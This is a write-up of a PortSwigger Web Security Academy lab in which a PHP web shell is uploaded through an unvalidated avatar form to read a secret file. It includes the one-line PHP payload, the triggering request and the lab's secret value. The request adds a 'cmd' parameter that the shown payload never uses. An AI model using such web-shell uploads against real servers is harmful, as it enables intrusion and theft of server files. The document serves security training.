Lab 1 — Remote Code Execution via Web Shell Upload

⚪ 🔴 High 📅 2026-05-13

📋 Finding Summary

FieldValue
TypeWeb App
TargetPortSwigger Web Security Academy
Severity🔴 High
CVE / CWECWE-434: Unrestricted Upload of File with Dangerous Type
Date2026-05-13

🔍 Description

The application allows authenticated users to upload an avatar image to their profile. It performs no validation on the file type, extension, or content before storing it on the server's filesystem. As a result, an attacker can upload a PHP web shell disguised as an avatar, which the server then executes when the file is requested directly. This grants the attacker the ability to execute arbitrary server-side commands and read sensitive files.

🎯 End Goals

  • Upload a PHP web shell to the server via the avatar upload function
  • Use the web shell to exfiltrate the contents of /home/carlos/secret
  • Submit the secret to solve the lab

🪜 Steps to Reproduce

  1. Log in to the application using the provided credentials (wiener:peter)
  2. Navigate to the account page and locate the avatar upload function
  3. Upload a benign image file to confirm the upload works and observe where files are stored
  4. Craft a PHP web shell file and upload it via the same avatar upload function
  5. Send a GET request directly to the uploaded PHP file's path to trigger execution
  6. Read the output of the web shell to retrieve the secret file contents
  7. Submit the secret to solve the lab

🧠 Analysis

Step 1 — Reconnaissance: Logging in and locating the upload function

Logged in as wiener using credentials wiener:peter. The account page revealed an avatar upload form accepting file uploads with a Browse and Upload button. No client-side restrictions were observed on accepted file types.

Step 2 — Confirming image upload works

Uploaded a benign JPEG image (images.jpeg) to confirm the upload mechanism was functional. The server responded with: The file avatars/images.jpeg has been uploaded. The avatar was then rendered on the account page, confirming the file was stored and served from avatars/.

Step 3 — Intercepting the upload request in Burp Suite

With Burp Suite proxy enabled, the POST request to /my-account/avatar was captured. The server returned HTTP 200 OK with the message The file avatars/images.jpeg has been uploaded. confirming the upload endpoint and storage path. No Content-Type or extension validation was observed in the response.

Step 4 — Crafting and uploading the PHP web shell

Using a terminal in the /port_swigger/file_upload directory, the PHP web shell file exploit.php was created with the following payload:

<?php echo file_get_contents('/home/carlos/secret'); ?>

The file was then uploaded via the avatar upload form. The server accepted it without any file type or extension validation and responded with: The file avatars/exploit.php has been uploaded. Burp Suite confirmed the POST request to /my-account/avatar returned HTTP 200 OK.

Step 5 — Triggering the web shell and retrieving the secret

Sent a GET request directly to /files/avatars/exploit.php?cmd=cat+/home/carlos/secret. The server executed the PHP file and returned the secret:

edm25PakrRS04MID1gjwp2GV4ItcUstHP

The secret was submitted via the lab banner to confirm the lab was solved.

🎯 Impact

An attacker can upload arbitrary server-side scripts and execute them remotely, achieving full Remote Code Execution (RCE) on the web server. This allows reading of sensitive files, lateral movement within the server environment, data exfiltration, and potentially full server compromise.
